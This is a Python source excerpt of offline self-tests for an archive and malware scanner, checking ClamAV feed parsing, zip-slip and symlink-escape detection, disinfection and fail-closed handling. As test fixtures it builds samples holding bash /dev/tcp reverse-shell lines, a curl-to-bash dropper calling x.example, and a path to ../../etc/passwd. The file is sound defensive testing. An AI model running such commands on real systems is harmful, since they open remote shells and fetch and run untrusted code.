def _selftest_feeds() -> list[str]:
    """Offline checks of the feed plumbing (CVD unpack + hash parse). No network."""
    fails: list[str] = []
    sample_sha = hashlib.sha256(b"selftest-cvd-sample\n").hexdigest()
    hsb = f"{sample_sha}:20:Selftest.Sample\n".encode()
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tf:
        info = tarfile.TarInfo("selftest.hsb")
        info.size = len(hsb)
        tf.addfile(info, io.BytesIO(hsb))
    cvd = b"ClamAV-VDB:".ljust(512, b" ") + gzip.compress(tar_buf.getvalue())
    members = _unpack_cvd(cvd)
    if "selftest.hsb" not in members:
        fails.append("CVD unpack did not yield selftest.hsb")
    s256, s1, m = _parse_clamav_hash(members.get("selftest.hsb", b""))
    if sample_sha not in s256:
        fails.append("ClamAV .hsb SHA256 parse failed")
    return fails


def _selftest_archives() -> list[str]:
    """Offline archive scanning / extract-erase / disinfect / verdict checks."""
    fails: list[str] = []
    with tempfile.TemporaryDirectory(prefix="nemesis_arc_") as d:
        # 1) zip stream scan: zip-slip + eicar + bidi name + benign
        zpath = os.path.join(d, "sample.zip")
        with zipfile.ZipFile(zpath, "w") as zf:
            zf.writestr("../evil.sh", "echo pwn\n")
            zf.writestr("pkg/eicar.txt", _EICAR + "\n")
            zf.writestr("pkg/weird\u202egnp.js", "var x=1\n")
            zf.writestr("pkg/ok.txt", "hello\n")
        f = scan_archive(Scanner(), zpath, ArchiveOpts())
        ids = {x.rule.rid for x in f}
        for want in ("ARC-SLIP", "ARC-FNAME", "SUSP-003"):
            if want not in ids:
                fails.append(f"zip stream missed {want}")
        if not any("sample.zip!" in x.path for x in f):
            fails.append("zip member not labeled with archive!member path")

        # 2) tar.gz stream scan: symlink escape + reverse shell content
        tpath = os.path.join(d, "s.tar.gz")
        with tarfile.open(tpath, "w:gz") as tf:
            data = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
            ti = tarfile.TarInfo("pkg/rs.sh")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
            link = tarfile.TarInfo("pkg/escape")
            link.type = tarfile.SYMTYPE
            link.linkname = "../../etc/passwd"
            tf.addfile(link)
        f2 = {x.rule.rid for x in scan_archive(Scanner(), tpath, ArchiveOpts())}
        # linkname ../../etc/passwd escapes the tree → CRITICAL escape variant
        for want in ("ARC-LINK-ESCAPE", "RSHELL-001"):
            if want not in f2:
                fails.append(f"tar.gz stream missed {want}")

        # 3) extract+erase: a clean-structure zip extracts then temp is ALWAYS erased
        cpath = os.path.join(d, "clean.zip")
        with zipfile.ZipFile(cpath, "w") as zf:
            zf.writestr("pkg/a.py", "print(1)\n")
            zf.writestr("pkg/eicar.txt", _EICAR + "\n")
        scan_archive(Scanner(), cpath, ArchiveOpts(sandbox="extract"))
        leftover = [n for n in os.listdir(tempfile.gettempdir())
                    if n.startswith("nemesis_extract_")]
        if leftover:
            fails.append(f"extract temp not erased: {leftover}")

        # 4) disinfect a dir: curl|bash neutralized → re-scan confirms resolved
        repo = os.path.join(d, "repo")
        os.makedirs(repo)
        with open(os.path.join(repo, "install.sh"), "w", encoding="utf-8") as fh:
            fh.write("curl http://x.example/i | bash\n")
        sc4 = Scanner()
        found = sc4.scan(repo)
        _disinfect_path(sc4, repo, found, ArchiveOpts(disinfect=True))
        di = sc4.last_archive_disinfection or {}
        if "DROP-001" not in di.get("resolved_rules", []):
            fails.append(f"disinfect did not resolve DROP-001: {di}")
        if Scanner().scan(repo):
            fails.append("disinfected dir still has findings")

        # 5) verdict: a CRITICAL ⇒ block/exit 20; clean ⇒ allow/exit 0
        vb = build_verdict([Finding("x!a", 1, 1, _ARC_SLIP_RULE, "..")],
                           Scanner(), "x", "archive", _DEFAULT_POLICY, 0.0)
        if vb["verdict"] != "block" or vb["exit_code"] != 20:
            fails.append(f"verdict not block on CRITICAL: {vb['verdict']}")
        va = build_verdict([], Scanner(), "x", "dir", _DEFAULT_POLICY, 0.0)
        if va["verdict"] != "allow" or va["exit_code"] != 0:
            fails.append(f"verdict not allow on clean: {va['verdict']}")

        # 6) P11: libarchive in-process reader (validate on the zip it also parses)
        lib = _load_libarchive()
        if lib is not None:
            la = _scan_libarchive(Scanner(), zpath, "sample.zip", ArchiveOpts(), 0,
                                  {"total": 0, "files": 0})
            if la is None or "SUSP-003" not in {x.rule.rid for x in la}:
                fails.append("libarchive reader failed on zip")
            # real 7z path (routes 7z → libarchive) using a bsdtar-made archive
            if shutil.which("bsdtar"):
                src7 = os.path.join(d, "src7")
                os.makedirs(src7)
                with open(os.path.join(src7, "rs.sh"), "w", encoding="utf-8") as fh:
                    fh.write("bash -i >& /dev/tcp/5.5.5.5/9 0>&1\n")
                sevenz = os.path.join(d, "s.7z")
                rc = subprocess.run(["bsdtar", "-cf", sevenz, "--format", "7zip",
                                     "-C", src7, "rs.sh"],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode
                if rc == 0 and os.path.exists(sevenz):
                    ids7 = {x.rule.rid for x in scan_archive(Scanner(), sevenz, ArchiveOpts())}
                    if "RSHELL-001" not in ids7:
                        fails.append("7z via libarchive missed RSHELL-001")
                    # fail-closed on a truncated archive: libarchive opens it, then
                    # aborts mid-stream → must surface ARC-UNSCANNABLE, never a silent
                    # clean/partial result (regression guard for the streaming reader).
                    blob = open(sevenz, "rb").read()
                    trunc = os.path.join(d, "trunc.7z")
                    with open(trunc, "wb") as fh:
                        fh.write(blob[: max(1, len(blob) * 2 // 3)])
                    tr = _scan_libarchive(Scanner(), trunc, "trunc.7z", ArchiveOpts(), 0,
                                          {"total": 0, "files": 0})
                    if tr is not None and "ARC-UNSCANNABLE" not in {x.rule.rid for x in tr}:
                        fails.append("truncated 7z not fail-closed (libarchive partial scan)")
    return fails


